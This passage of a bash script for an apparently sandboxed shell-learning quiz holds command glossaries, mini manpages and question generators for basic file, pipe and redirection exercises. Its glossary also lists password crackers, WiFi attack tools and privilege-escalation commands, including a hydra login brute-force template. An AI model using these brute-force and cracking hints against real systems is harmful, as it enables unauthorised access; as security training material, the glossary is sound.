  [john]=$'\e[32;1mjohn\e[0m \e[2m- password cracker\e[0m
  \e[36m--wordlist\e[0m=FILE   dictionary     \e[36m--format\e[0m=TYPE   hash type
  \e[36m--show\e[0m            cracked        \e[36m--list\e[0m=formats  list types'
  [tshark]=$'\e[32;1mtshark\e[0m \e[2m- terminal packet analyzer\e[0m
  \e[36m-r\e[0m FILE   read pcap              \e[36m-i\e[0m IFACE  capture live
  \e[36m-Y\e[0m FILTER display filter         \e[36m-T\e[0m fields output format
  \e[33mFILTERS:\e[0m ip.addr==X tcp.port==Y http ftp dns'
  [curl]=$'\e[32;1mcurl\e[0m \e[2m- HTTP client\e[0m
  \e[36m-X\e[0m METHOD  GET/POST/PUT/DELETE   \e[36m-H\e[0m \e[2m'"'"'K: V'"'"'\e[0m  header
  \e[36m-d\e[0m DATA    POST body              \e[36m-o\e[0m FILE   output file
  \e[36m-L\e[0m         follow redirects       \e[36m-s\e[0m        silent'
  [find]=$'\e[32;1mfind\e[0m \e[2m- search for files\e[0m
  \e[36m-name\e[0m \e[2m'"'"'X'"'"'\e[0m   filename            \e[36m-type\e[0m f/d  file or dir
  \e[36m-size\e[0m +10M  larger than         \e[36m-mtime\e[0m -7  last 7 days
  \e[36m-exec\e[0m CMD {} \\;  run on each   \e[36m-delete\e[0m    remove'
  [awk]=$'\e[32;1mawk\e[0m \e[2m- pattern scanning\e[0m
  \e[33m'"'"'{print $1}'"'"'\e[0m   first field       \e[33m'"'"'{print $NF}'"'"'\e[0m  last field
  \e[36m-F\e[0m\e[2m'"'"','"'"'\e[0m          delimiter          \e[33mNR\e[0m          line number
  \e[33m'"'"'/pat/'"'"'\e[0m        match lines        \e[33mBEGIN{} END{}\e[0m'
  [sed]=$'\e[32;1msed\e[0m \e[2m- stream editor\e[0m
  \e[33m'"'"'s/old/new/'"'"'\e[0m    replace first     \e[33m'"'"'s/old/new/g'"'"'\e[0m  replace all
  \e[36m-i\e[0m            edit in place     \e[33m'"'"'/pat/d'"'"'\e[0m       delete lines'
  [xargs]=$'\e[32;1mxargs\e[0m \e[2m- build commands from stdin\e[0m
  \e[36m-I\e[0m {}     placeholder            \e[36m-0\e[0m        null delim
  \e[36m-n\e[0m N      args per command       \e[36m-P\e[0m N      parallel'
  [tar]=$'\e[32;1mtar\e[0m \e[2m- archive tool\e[0m
  \e[36m-c\e[0m create   \e[36m-x\e[0m extract   \e[36m-v\e[0m verbose   \e[36m-f\e[0m FILE
  \e[36m-z\e[0m gzip     \e[36m-j\e[0m bzip2     \e[36m-C\e[0m DIR       \e[36m-t\e[0m list'
  [ssh]=$'\e[32;1mssh\e[0m \e[2m- secure shell\e[0m
  \e[36m-i\e[0m KEY    identity file          \e[36m-p\e[0m PORT   port
  \e[36m-L\e[0m P:H:P  local forward          \e[36m-D\e[0m PORT   SOCKS proxy
  \e[36m-J\e[0m HOST   jump host              \e[36m-N\e[0m        no command'
  [git]=$'\e[32;1mgit\e[0m \e[2m- version control\e[0m
  \e[33madd\e[0m     stage      \e[33mcommit\e[0m  save       \e[33mpush\e[0m    upload
  \e[33mpull\e[0m    download   \e[33mstatus\e[0m  changes    \e[33mdiff\e[0m    compare
  \e[33mlog\e[0m     history    \e[33mbranch\e[0m  branches   \e[33mmerge\e[0m   combine'
)

declare -A EXP=(
  [pwd]="print working directory (where you are)"
  [echo]="print text to stdout" [cat]="concatenate and display file contents" [ls]="list directory contents"
  [cd]="change directory" [cp]="copy files" [mv]="move/rename files" [rm]="delete files permanently"
  [mkdir]="create directory" [touch]="create file/update timestamp"
  [head]="head -N FILE: first N lines (default 10)"
  [tail]="tail -N FILE: last N lines (-f to follow)"
  [grep]="grep PATTERN FILE: search lines matching pattern"
  [find]="find PATH -name 'x': locate files by name/size/date"
  [wc]="word count: -l lines, -w words, -c bytes"
  [sort]="sort lines alphabetically (-n numeric, -r reverse, -k N by column N)"
  [uniq]="filter adjacent duplicates (use sort | uniq for all dupes)" [cut]="cut -d',' -fN: extract column N"
  ['--sort=-%cpu']="sort by CPU% descending (- = descending)"
  ['--sort=-%mem']="sort by memory% descending"
  [tr]="tr FROM TO: map chars (tr a-z A-Z = lowercase→uppercase)"
  [diff]="compare files" [tar]="archive tool" [tee]="copy stdin to file AND stdout" [xargs]="build commands from stdin"
  [chmod]="change permissions" [kill]="send signal to process (default: terminate)" [jobs]="list background jobs" [fg]="foreground job"
  [bg]="background job" [sleep]="pause N seconds" [make]="build tool" [gcc]="C compiler"
  [date]="show/set date" [du]="disk usage" [ps]="list processes" [mount]="attach filesystem"
  [dd]="low-level copy" [strings]="extract text from binary" [base64]="encode/decode base64"
  [rg]="ripgrep: fast grep" [fd]="fast find" [eza]="modern ls" [bat]="cat with highlighting"
  [sd]="simple sed" [dust]="visual du" [tree]="directory tree" [sed]="stream editor" [xxd]="hex dump"
  [md5sum]="MD5 hash (weak)" [sha256sum]="SHA256 hash" [nmap]="port scanner" [hydra]="password cracker"
  [hashcat]="GPU hash cracker" [john]="John the Ripper" [tshark]="terminal wireshark"
  [masscan]="fast port scanner" [airmon-ng]="WiFi monitor mode"
  [airodump-ng]="capture 802.11" [aireplay-ng]="inject packets" [aircrack-ng]="crack WPA/WEP"
  [nc]="netcat" [smbclient]="SMB client" [lynis]="security audit" [binwalk]="firmware analysis"
  [foremost]="file recovery" [fls]="list disk image" [exiftool]="file metadata" [readelf]="ELF info"
  [r2]="radare2 RE framework" [volatility3]="memory forensics" [mactime]="filesystem timeline"
  [proxychains]="proxy traffic" [procs]="modern ps"
  [awk]="pattern scanning & processing" [jq]="JSON processor" [curl]="transfer data (HTTP/FTP)"
  [ssh]="secure shell" [scp]="secure copy" [rsync]="fast incremental transfer"
  [zip2john]="extract hash from zip" [pdf2john]="extract hash from pdf" [rar2john]="extract hash from rar"
  [openssl]="crypto toolkit" [socat]="multipurpose relay" [tmux]="terminal multiplexer"
  [ln]="create links" [readlink]="show link target" [pgrep]="find process by name" [pkill]="kill by name"
  [pidof]="get PID by name" [pstree]="process tree" [ip]="network config" [ss]="socket statistics"
  [lsof]="list open files" [systemctl]="systemd control" [journalctl]="systemd logs"
  [wget]="download files" [unlink]="remove link"
  ['$$']="current shell PID" ['$?']="last exit code" ['$!']="last background PID"
  ['$#']="argument count" ['$@']="all arguments" ['$0']="script name"
  ['!!']="repeat last command" ['!$']="last arg of prev cmd" ['!^']="first arg of prev cmd" ['!*']="all args of prev cmd"
  ['>']="write stdout to file (overwrite)"
  ['>>']="append stdout to file"
  ['2>']="redirect stderr to file"
  ['&>']="redirect stdout+stderr to file"
  ['/dev/null']="black hole: discards anything written to it"
  ['2>&1']="merge stderr into stdout"
  ['<']="input redirect: feed file contents INTO command (like typing it)"
  ['<<<']="here-string: feed text INTO command (like typing it)"
  # Path symbols
  ['.']="current directory"
  ['..']="parent directory"
  ['~']="home directory"
  ['/']="root directory (or path separator)"
  # Globs/wildcards
  ['*']="wildcard: matches any characters"
  ['?']="wildcard: matches single character"
  ['*.py']="glob: all files ending in .py"
  ['*.log']="glob: all files ending in .log"
  ['*.txt']="glob: all files ending in .txt"
  ['*.sh']="glob: all files ending in .sh"
  ['*.conf']="glob: all files ending in .conf"
  # Quoted versions (as they appear in commands)
  ["'*.py'"]="glob: all .py files (quoted to prevent shell expansion)"
  ["'*.log'"]="glob: all .log files (quoted to prevent shell expansion)"
  ["'*.txt'"]="glob: all .txt files (quoted to prevent shell expansion)"
  ["'*.sh'"]="glob: all .sh files (quoted to prevent shell expansion)"
  ["'*.conf'"]="glob: all .conf files (quoted to prevent shell expansion)"
  ["'*'"]="glob: all files (quoted to prevent shell expansion)"
  # Quoting
  ["'...'"]="single quotes: literal string, no expansion"
  ['"..."']="double quotes: allows \$var expansion"
  ["'hello'"]="literal string 'hello'"
  ['|']="pipe: cmd1 | cmd2 (stdout→stdin)"
  ['|&']="pipe stdout+stderr"
  ['&&']="run next only if previous succeeds"
  ['||']="run next only if previous fails"
  ['&']="run in background (returns immediately)"
  ['a-z']="character range: all lowercase letters"
  ['A-Z']="character range: all uppercase letters"
  ['0-9']="character range: all digits"
  # Parameter expansion
  ['${#var}']="string length" ['${var:-}']="default if unset" ['${var:=}']="set if unset"
  ['${var:?}']="error if unset" ['${var:+}']="alt if set" ['${var#}']="remove prefix (short)"
  ['${var##}']="remove prefix (long)" ['${var%}']="remove suffix (short)" ['${var%%}']="remove suffix (long)"
  ['${var/}']="replace first" ['${var//}']="replace all" ['${var:n}']="substring from n"
  ['${var:n:m}']="substring n to m" ['${var,,}']="lowercase" ['${var^^}']="uppercase"
  # Arrays
  [declare]="declare variable type" [mapfile]="read lines into array" [readarray]="read lines into array"
  ['${arr[@]}']="all array elements" ['${#arr[@]}']="array length" ['${!arr[@]}']="array indices"
  # Control flow
  [if]="conditional execution" [then]="if body start" [else]="if alternative" [elif]="else if"
  [fi]="end if" [for]="loop over items" [while]="loop while true" [until]="loop until true"
  [do]="loop body start" [done]="end loop" [case]="pattern matching" [esac]="end case"
  [function]="define function" [local]="local variable" [return]="function return"
  [trap]="handle signals" [set]="shell options" [shopt]="bash options"
  # Advanced tools
  [strace]="trace syscalls" [ltrace]="trace library calls" [watch]="run command repeatedly"
  [inotifywait]="watch filesystem events" [parallel]="run jobs in parallel" [flock]="file locking"
  [timeout]="limit command runtime" [chroot]="change root dir" [fsck]="filesystem check"
  [cryptsetup]="LUKS encryption" [iptables]="IPv4 firewall" [nftables]="netfilter firewall"
  [shred]="secure file delete" [smartctl]="disk SMART info" [gcore]="dump process memory"
  [coproc]="coprocess (bidirectional pipe)" [mkfifo]="create named pipe" [fuser]="find process using file"
  [renice]="change process priority" [cgcreate]="create cgroup" [cgexec]="run in cgroup"
  [enum4linux]="SMB enumeration" [wash]="WPS scanner"
  [reaver]="WPS attack tool" [chkrootkit]="rootkit checker" [rkhunter]="rootkit hunter"
  # Git
  [git]="version control" [clone]="copy repository" [commit]="save changes" [push]="upload to remote"
  [pull]="download from remote" [fetch]="download without merge" [merge]="combine branches"
  [rebase]="reapply commits" [stash]="save changes temporarily" [branch]="manage branches"
  [checkout]="switch branch/restore" [switch]="switch branches" [restore]="restore files"
  [reset]="undo commits" [revert]="undo with new commit" [cherry-pick]="apply specific commit"
  [bisect]="binary search for bug" [reflog]="reference logs" [blame]="show line authors"
  [tag]="mark releases" [remote]="manage remotes" [log]="show history"
  # tmux
  [tmux]="terminal multiplexer" [screen]="terminal multiplexer" [attach]="connect to session"
  [detach]="disconnect from session" [new-session]="create session" [kill-session]="destroy session"
  [split-window]="create pane" [select-pane]="switch pane" [resize-pane]="change pane size"
  [send-keys]="type in pane" [capture-pane]="copy pane content" [source-file]="reload config"
  # Privesc
  [getcap]="show capabilities" [setcap]="set capabilities" [whoami]="current user"
  [id]="user/group IDs" [sudo]="run as root" [su]="switch user" [passwd]="change password"
  [useradd]="create user" [usermod]="modify user" [chown]="change owner" [chgrp]="change group"
  [mount]="attach filesystem" [umount]="detach filesystem" [showmount]="list NFS exports"
  [lxc]="LXD container tool" [searchsploit]="exploit database search"
  ['-r']="recursive" ['-i']="case insensitive" ['-v']="invert/verbose" ['-l']="lines (wc) / long (ls) / login (hydra)"
  ['-n']="no newline (echo) / line numbers (cat/grep)" ['-c']="command (python) / count (grep) / bytes (wc)" ['-q']="quiet" ['-f']="keep watching for new lines (tail) / force (rm)" ['-p']="create parents"
  ['-e']="extension" ['-t']="type" ['-x']="execute" ['-h']="human readable" ['-s']="size/silent"
  ['-a']="all/hidden" ['-u']="unique" ['-k']="key/column" ['-d']="directory itself (ls) / delimiter (cut)" ['-o']="output" ['-w']="words (wc) / width"
  ['-A']="aggressive scan" ['-O']="OS detection" ['-sV']="version detection" ['-sC']="default scripts"
  ['-sU']="UDP scan" ['-sn']="ping scan" ['-sT']="TCP connect" ['-Pn']="skip ping" ['-F']="fast mode"
  ['-p-']="all ports" ['-m']="hash type" ['--show']="show cracked" ['--wordlist']="dictionary file"
  ['-E']="entropy/extended regex" ['-Y']="display filter" ['-T']="tree/fields"
  ['{}']="filename placeholder" ['\;']="end -exec" ['-exec']="run on each" ['-delete']="delete matches"
  ['-name']="match filename" ['-size']="match size" ['-type']="match type" ['-mmin']="match time" ['-path']="match path" ['-not']="negate"
  ['-P']="password file (hydra) / parallel jobs (xargs)" ['-0']="null delimiter" ['-I']="replace string" ['NR']="awk line number"
  ['NF']="awk field count" ['$1']="first field" ['$NF']="last field" ['FS']="field separator"
  ['-L']="follow symlinks/local forward" ['-R']="remote forward" ['-D']="dynamic SOCKS proxy" ['-J']="jump host"
  ['-N']="no remote command" ['-oN']="normal output" ['-oG']="greppable output" ['-oA']="all output formats"
  # hydra protocols and flags
  ['http-post-form']="POST login (hydra): '/path:user=^USER^&pass=^PASS^:fail_text'"
  ['http-get']="GET auth (hydra)" ['ssh']="SSH brute force" ['ftp']="FTP brute force"
  ['-L']="username list file (hydra) / follow symlinks"
  ['-t']="threads (hydra) / type (file)"
)
explain() {
  local tok n=0 exp label desc tcol cmd
  echo -e "${D}────────────────────────────────────────${N}"
  # Get first command (skip env vars like VAR=val)
  for tok in $1; do [[ "$tok" != *=* ]] && { cmd="$tok"; break; }; done
  # Show mini manpage if available (skip token breakdown - manpage is comprehensive)
  if [[ -n "${MANPAGE[$cmd]:-}" ]]; then
    echo -e "${MANPAGE[$cmd]}"
    echo -e "${D}────────────────────────────────────────${N}"
    return
  fi
  for tok in $1; do
    exp="${EXP[$tok]:-}"
    if [[ -n "$exp" ]]; then
      # Choose token color based on type
      tcol="${G}"  # default: green for commands
      case "$tok" in
        .|..|~|/*) tcol="${Bl}" ;;  # paths = blue
        '>'|'>>'|'<'|'<<<'|'2>'|'&>'|'2>&1'|'|'|'|&') tcol="${R}" ;;  # redirects/pipes = red
        '&&'|'||'|';'|'&') tcol="${R}" ;;  # operators = red
        -*) tcol="${C}" ;;  # flags = cyan
      esac

      # Split on first colon if present: "label: description"
      if [[ "$exp" == *:* ]]; then
        label="${exp%%:*}"
        desc="${exp#*: }"
        # If label has spaces, it's an example - use magenta
        if [[ "$label" == *" "* ]]; then
          echo -e "  ${tcol}${tok}${N}  ${D}→${N}  ${M}${label}${D}:${N} ${W}${desc}${N}"
        else
          echo -e "  ${tcol}${tok}${N}  ${D}→${N}  ${Y}${label}${D}:${N} ${W}${desc}${N}"
        fi
      else
        echo -e "  ${tcol}${tok}${N}  ${D}→${N}  ${W}${exp}${N}"
      fi
      ((++n))
    fi
  done
  # Show full answer if no explanations found
  ((n == 0)) && { echo -e "  ${Y}$1${N}"; ((++n)); }
  echo -e "${D}────────────────────────────────────────${N}"
  EXPLAIN_LINES=$((n + 2))
}

# Parse question - handles both | and § delimiters (§ for answers with ||)
# Also extracts sandbox markers: #output:, #state:, #text:
_qoutput="" _qstate="" _qtext=0
_qparse() {
  local q=$1
  _qoutput="" _qstate="" _qtext=0

  # Extract sandbox markers from end
  if [[ $q == *"#text:"* ]]; then
    _qtext=1
    q="${q%%#text:*}"
  fi
  if [[ $q == *"#state:"* ]]; then
    _qstate="${q##*#state:}"
    q="${q%%#state:*}"
  fi
  if [[ $q == *"#output:"* ]]; then
    _qoutput="${q##*#output:}"
    _qoutput="${_qoutput%%#*}"  # Remove any trailing markers
    q="${q%%#output:*}"
  fi

  # Parse prompt and answers
  if [[ $q == *§* ]]; then
    _qprompt="${q%%§*}"; _qanswers="${q#*§}"; _qans="${_qanswers%%§*}"
  else
    _qprompt="${q%%|*}"; _qanswers="${q#*|}"; _qans="${_qanswers%%|*}"
  fi
}

# Vi mode: always on (override with CMD_VI=0)
VI_MODE=${CMD_VI:-1}

# ═══════════════════════════════════════════════════════════════════════════════
# QUESTION GENERATORS - Dynamic questions with infinite variations
# ═══════════════════════════════════════════════════════════════════════════════

# Level 0: First Commands (pwd, ls, echo, cd)
gen_level0() {
  local questions=() dir dir2 word num; _ctx
  dir=$(_phrase src data logs); dir2=$(_phrase backup temp config test)
  word=$(_phrase hello ready done test ping); num=$((RANDOM % 50 + 1))

  # pwd variations
  questions+=("$(_phrase "Print" "Show" "Display") current directory|pwd|#output:~^/sandbox")
  questions+=("$(_phrase "Where am I" "What directory" "Current path")?|pwd|#output:~^/")

  # ls variations
  questions+=("$(_phrase "List" "Show") files in current directory|ls|#output:~server.log")
  questions+=("List $(_phrase "all files" "files") including hidden|ls -a|#output:~\\.")
  questions+=("List files with $(_phrase "details" "permissions" "long format")|ls -l|#output:~^[-drwx]")
  questions+=("List files in ${W}${dir}${C} directory|ls ${dir}|#output:*")
  questions+=("List ${W}${dir}${C} with details|ls -l ${dir}|#output:~^[-drwx]")

  # echo variations
  questions+=("Print ${Y}hello world${C}|echo hello world|echo 'hello world'|#output:hello world")
  questions+=("Print ${Y}${word}${C}|echo ${word}|#output:${word}")
  questions+=("Print your username using ${Y}\$USER${C}|echo \$USER|#output:~.")
  questions+=("Print your home directory using ${Y}\$HOME${C}|echo \$HOME|#output:~home")
  questions+=("Print current shell using ${Y}\$SHELL${C}|echo \$SHELL|#output:~sh")
  questions+=("Print the number ${Y}${num}${C}|echo ${num}|#output:${num}")
  questions+=("Print: ${Y}${word} ${word} ${word}${C}|echo ${word} ${word} ${word}|#output:${word} ${word} ${word}")

  # cd variations
  questions+=("$(_phrase "Change to" "Go to" "Enter") ${W}${dir}${C} directory|cd ${dir}|#output:*")
  questions+=("$(_phrase "Change to" "Go to") ${W}${dir2}${C}|cd ${dir2}|#output:*")
  questions+=("Go to home directory|cd|cd ~|#output:*")
  questions+=("Go up one directory|cd ..|#output:*")
  questions+=("Go up two directories|cd ../..|#output:*")
  questions+=("Go to root directory|cd /|#output:*")

  # mkdir
  questions+=("Create directory ${W}${dir2}${C}|mkdir ${dir2}|#output:*")
  questions+=("Create nested directories ${W}${dir}/${dir2}${C} (parents too)|mkdir -p ${dir}/${dir2}|#output:*")

  printf '%s\n' "${questions[@]}"
}

# Level 1: Save Output (>, >>)
gen_level1() {
  local questions=() log log2 txt cfg word word2 word3 outfile outfile2 num; _ctx
  log=$(_pick SANDBOX_LOGS); log2=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS); cfg=$(_pick SANDBOX_CFGS)
  word=$(_phrase hello done ready complete finished saved started stopped)
  word2=$(_phrase entry note line record message update backup)
  word3=$(_phrase success error warning info debug trace)
  outfile=$(_phrase output.txt files.txt list.txt result.txt)
  outfile2=$(_phrase report.txt data.txt dump.txt export.txt)
  num=$((RANDOM % 100 + 1))

  # Output redirection: > overwrites, >> appends (mixed to teach the difference)
  questions+=("Write '${word}' to ${W}${txt}${C} - overwrite (use ${Y}>${C})|echo ${word} > ${txt}|#state:contains:${txt}:${word}")
  questions+=("Append '${word2}' to ${W}${log}${C} - add to end (use ${Y}>>${C})|echo ${word2} >> ${log}|#state:contains:${log}:${word2}")
  questions+=("Save ls to ${W}${outfile}${C} - overwrite (use ${Y}>${C})|ls > ${outfile}|#state:contains:${outfile}:server.log")
  questions+=("Append timestamp to ${W}${log}${C} (use ${Y}date${C} + ${Y}>>${C})|date >> ${log}|#state:contains:${log}:2026")
  questions+=("Save whoami to ${W}${outfile}${C} - overwrite (use ${Y}>${C})|whoami > ${outfile}|#state:exists:${outfile}")
  questions+=("Append hostname to ${W}${log}${C} (use ${Y}>>${C})|hostname >> ${log}|#state:exists:${log}")
  questions+=("Create empty file ${W}${outfile2}${C} (use ${Y}touch${C})|touch ${outfile2}|#state:exists:${outfile2}")

  # tee - write to file AND stdout
  questions+=("Echo '${word}' to screen AND save to ${W}${txt}${C} (use ${Y}tee${C})|echo ${word} | tee ${txt}|#output:${word}")
  questions+=("Echo '${word2}' and append to ${W}${log}${C} (use ${Y}tee -a${C})|echo ${word2} | tee -a ${log}|#output:${word2}")
  questions+=("Run ls, show output AND save to ${W}${outfile}${C}|ls | tee ${outfile}|#output:~server.log")

  printf '%s\n' "${questions[@]}"
}

# Level 2: Read Files (cat, head, tail)
gen_level2() {
  local questions=() log log2 txt txt2 cfg cfg2 n n2 n3; _ctx
  log=$(_pick SANDBOX_LOGS); log2=$(_pick SANDBOX_LOGS)
  txt=$(_pick SANDBOX_TXTS); txt2=$(_pick SANDBOX_TXTS)
  cfg=$(_pick SANDBOX_CFGS); cfg2=$(_pick SANDBOX_CFGS)
  n=$((RANDOM % 6 + 3)); n2=$((RANDOM % 5 + 2)); n3=$((RANDOM % 8 + 5))

  # cat - display file (hint base command, user figures out flags)
  questions+=("Display entire ${W}${txt}${C} (use ${Y}cat${C})|cat ${txt}|#output:~.")
  questions+=("Display ${W}${cfg}${C} with line numbers (use ${Y}cat${C})|cat -n ${cfg}|#output:~^\\s+1")

  # head - first N lines (user figures out -N flag)
  questions+=("First ${n} lines of ${W}${log}${C} (use ${Y}head${C})|head -${n} ${log}|head -n ${n} ${log}|#output:@${n}")
  questions+=("First 10 lines of ${W}${cfg}${C} (use ${Y}head${C})|head ${cfg}|head -10 ${cfg}|head -n 10 ${cfg}|#output:@10")
  questions+=("First line only of ${W}${log}${C} (use ${Y}head${C})|head -1 ${log}|head -n 1 ${log}|#output:@1")

  # tail - last N lines (user figures out -N flag)
  questions+=("Last ${n2} lines of ${W}${txt}${C} (use ${Y}tail${C})|tail -${n2} ${txt}|tail -n ${n2} ${txt}|#output:@${n2}")
  questions+=("Last 10 lines of ${W}${log}${C} (use ${Y}tail${C})|tail ${log}|tail -10 ${log}|tail -n 10 ${log}|#output:@10")
  questions+=("Last line only of ${W}${txt}${C} (use ${Y}tail${C})|tail -1 ${txt}|tail -n 1 ${txt}|#output:@1")

  # less - scrollable file viewer
  questions+=("View ${W}${log}${C} with scrolling (use ${Y}less${C})|less ${log}|#text:")
  questions+=("View ${W}${txt}${C} with line numbers in less|less -N ${txt}|#text:")

  printf '%s\n' "${questions[@]}"
}

# Level 3: Basic Pipes (|)
gen_level3() {
  local questions=() n n2 n3 log log2 txt txt2 cfg cfg2 csv term1 term2 term3; _ctx
  n=$((RANDOM % 5 + 3)); n2=$((RANDOM % 4 + 2)); n3=$((RANDOM % 6 + 5))
  log=$(_pick SANDBOX_LOGS); log2=$(_pick SANDBOX_LOGS)
  txt=$(_pick SANDBOX_TXTS); txt2=$(_pick SANDBOX_TXTS)
  cfg=$(_pick SANDBOX_CFGS); cfg2=$(_pick SANDBOX_CFGS)
  csv=$(_pick SANDBOX_CSVS)
  term1=$(_phrase ERROR WARN INFO GET POST); term2=$(_phrase debug error warning failed success)
  term3=$(_phrase active pending completed running started)

  # ls | wc variants (hint at pipe since this level teaches pipes)
  questions+=("Count files in current directory (pipe ${Y}ls${C} to ${Y}wc${C})§ls | wc -l§#output:~^\\s*[0-9]+")
  questions+=("Count items in directory (pipe ${Y}ls -1${C} to ${Y}wc -l${C})§ls -1 | wc -l§#output:~^\\s*[0-9]+")

  # head/tail through pipe
  questions+=("$(_phrase "Show" "Get") first ${n} lines of ${W}${log}${C}§head -${n} ${log}§cat ${log} | head -${n}§#output:@${n}")
  questions+=("$(_phrase "Show" "Get") last ${n2} lines of ${W}${cfg}${C}§tail -${n2} ${cfg}§cat ${cfg} | tail -${n2}§#output:@${n2}")
  questions+=("First ${n3} lines of ${W}${txt}${C}§head -${n3} ${txt}§cat ${txt} | head -${n3}§#output:@${n3}")

  # grep basics
  questions+=("$(_phrase "Search for" "Find") ${Y}${term1}${C} in ${W}${log}${C}§grep ${term1} ${log}§#output:*")
  questions+=("Find ${Y}${term2}${C} in ${W}${txt}${C}§grep ${term2} ${txt}§#output:*")
  questions+=("Search ${W}${cfg}${C} for ${Y}${term3}${C}§grep ${term3} ${cfg}§#output:*")

  # grep -c (count)
  questions+=("Count ${Y}${term2}${C} matches in ${W}${txt}${C}§grep -c ${term2} ${txt}§#output:~^\\s*[0-9]+")
  questions+=("Count ${Y}${term1}${C} occurrences in ${W}${log}${C}§grep -c ${term1} ${log}§#output:~^\\s*[0-9]+")

  # grep -i (case insensitive)
  questions+=("Find ${Y}${term1}${C} case-insensitive in ${W}${log}${C}§grep -i ${term1} ${log}§#output:*")
  questions+=("Search ${W}${txt}${C} for ${Y}${term2}${C} ignoring case§grep -i ${term2} ${txt}§#output:*")

  # grep -v (invert)
  questions+=("Show lines NOT containing ${Y}${term1}${C} in ${W}${log}${C}§grep -v ${term1} ${log}§#output:*")
  questions+=("Exclude ${Y}${term2}${C} lines from ${W}${txt}${C}§grep -v ${term2} ${txt}§#output:*")

  # sort variants
  questions+=("Sort ${W}${txt}${C} alphabetically§sort ${txt}§#output:*")
  questions+=("Sort ${W}${cfg}${C} in reverse§sort -r ${cfg}§#output:*")
  questions+=("Sort ${W}${csv}${C} numerically§sort -n ${csv}§#output:*")
  questions+=("Sort ${W}${txt2}${C} and remove duplicates§sort ${txt2} | uniq§sort -u ${txt2}§#output:*")
  questions+=("Unique sorted lines from ${W}${txt}${C}§sort -u ${txt}§sort ${txt} | uniq§#output:*")

  # wc variants
  questions+=("Count lines in ${W}${csv}${C}§wc -l ${csv}§#output:~[0-9]+")
  questions+=("Count words in ${W}${txt}${C}§wc -w ${txt}§#output:~[0-9]+")
  questions+=("Count characters in ${W}${cfg}${C}§wc -c ${cfg}§wc -m ${cfg}§#output:~[0-9]+")

  # Combined pipes
  questions+=("First ${n} ${Y}${term1}${C} matches in ${W}${log}${C}§grep ${term1} ${log} | head -${n}§#output:*")
  questions+=("Last ${n2} lines of ${W}${log}${C} containing ${Y}${term2}${C}§grep ${term2} ${log} | tail -${n2}§#output:*")
  questions+=("Count unique lines in ${W}${txt}${C}§sort ${txt} | uniq | wc -l§sort -u ${txt} | wc -l§#output:~[0-9]+")
  questions+=("Sort ${W}${log}${C} and show first ${n}§sort ${log} | head -${n}§#output:@${n}")
  questions+=("Show last ${n2} sorted lines of ${W}${cfg}${C}§sort ${cfg} | tail -${n2}§#output:@${n2}")
  questions+=("Find ${Y}${term1}${C} lines, then count them§grep ${term1} ${log} | wc -l§grep -c ${term1} ${log}§#output:~[0-9]+")

  # xargs - build commands from input
  questions+=("Echo each line of ${W}${txt}${C} as argument§cat ${txt} | xargs echo§#output:*")
  questions+=("List files from ${W}${txt}${C} (one per line)§cat ${txt} | xargs ls§xargs ls < ${txt}§#output:*")
  questions+=("Remove files listed in ${W}${txt}${C} (carefully!)§cat ${txt} | xargs rm§xargs rm < ${txt}§#text:")

  printf '%s\n' "${questions[@]}"
}

# Level 4: Input Redirection (<, <<<)
gen_level4() {
  local questions=() txt txt2 csv log cfg word word2; _ctx
  txt=$(_pick SANDBOX_TXTS); txt2=$(_pick SANDBOX_TXTS)
  csv=$(_pick SANDBOX_CSVS); log=$(_pick SANDBOX_LOGS); cfg=$(_pick SANDBOX_CFGS)
  word=$(_phrase hello world example config backup server admin debug)
  word2=$(_phrase test data input query search token ready active)

  local n=$((RANDOM % 5 + 3)) n2=$((RANDOM % 4 + 2))
  local num1=$((RANDOM % 50 + 10)) num2=$((RANDOM % 20 + 5))
  local num3=$((RANDOM % 100 + 50)) num4=$((RANDOM % 30 + 10))

  # < reads file as input
  questions+=("Count lines in ${W}${csv}${C} using ${Y}<${C}|wc -l < ${csv}|#output:~^\\s*[0-9]+")
  questions+=("Sort ${W}${txt}${C} using ${Y}<${C}|sort < ${txt}|#output:*")
  questions+=("Show first ${n} lines of ${W}${log}${C} using ${Y}<${C}|head -${n} < ${log}|#output:@${n}")
  questions+=("Show last ${n2} lines of ${W}${cfg}${C} using ${Y}<${C}|tail -${n2} < ${cfg}|#output:@${n2}")
  questions+=("Search for ${Y}GET${C} in ${W}${log}${C} using ${Y}<${C}|grep GET < ${log}|#output:~GET")
  questions+=("Count words in ${W}${txt}${C} using ${Y}<${C}|wc -w < ${txt}|#output:~[0-9]+")
  questions+=("Reverse sort ${W}${txt2}${C} using ${Y}<${C}|sort -r < ${txt2}|#output:*")
  questions+=("Search for ${Y}ERROR${C} in ${W}${log}${C} using ${Y}<${C}|grep ERROR < ${log}|#output:*")

  # <<< feeds a string (here-string)
  questions+=("Uppercase ${Y}'${word}'${C} (use ${Y}<<<${C} with tr)|tr a-z A-Z <<< '${word}'|tr a-z A-Z <<< ${word}|#output:~[A-Z]")
  questions+=("Lowercase ${Y}'${word2^^}'${C} (use ${Y}<<<${C})|tr A-Z a-z <<< '${word2^^}'|#output:~[a-z]")
  questions+=("Reverse ${Y}'${word}'${C} (use ${Y}<<<${C} with rev)|rev <<< '${word}'|rev <<< ${word}|#output:*")
  questions+=("Reverse ${Y}'${word2}'${C}|rev <<< '${word2}'|rev <<< ${word2}|#output:*")

  # bc calculations (one example)
  questions+=("Calculate ${Y}${num1}+${num2}${C} with bc|bc <<< '${num1}+${num2}'|bc <<< ${num1}+${num2}|#output:~$((num1+num2))")

  # cut with <<<
  questions+=("Extract home dir from ${Y}'root:x:0:0:root:/root:/bin/bash'${C}|cut -d: -f6 <<< 'root:x:0:0:root:/root:/bin/bash'|#output:~/root")
  questions+=("Get username from ${Y}'john:x:1000:1000:John:/home/john:/bin/bash'${C}|cut -d: -f1 <<< 'john:x:1000:1000:John:/home/john:/bin/bash'|#output:~john")

  # wc with <<<
  questions+=("Count words in ${Y}'${word} ${word2} test'${C}|wc -w <<< '${word} ${word2} test'|#output:~3")
  questions+=("Count chars in ${Y}'${word}'${C}|wc -c <<< '${word}'|wc -m <<< '${word}'|#output:~[0-9]+")

  # tr transformations
  questions+=("Replace spaces with underscores in ${Y}'hello world test'${C}|tr ' ' '_' <<< 'hello world test'|#output:~hello_world_test")
  questions+=("Delete digits from ${Y}'abc123def456'${C}|tr -d '0-9' <<< 'abc123def456'|#output:~abcdef")

  printf '%s\n' "${questions[@]}"
}

# Level 5: Error Redirection (2>, &>, 2>&1)
gen_level5() {
  local questions=() script script2 ext ext2 errfile errfile2 outfile outfile2 log missing missing2; _ctx
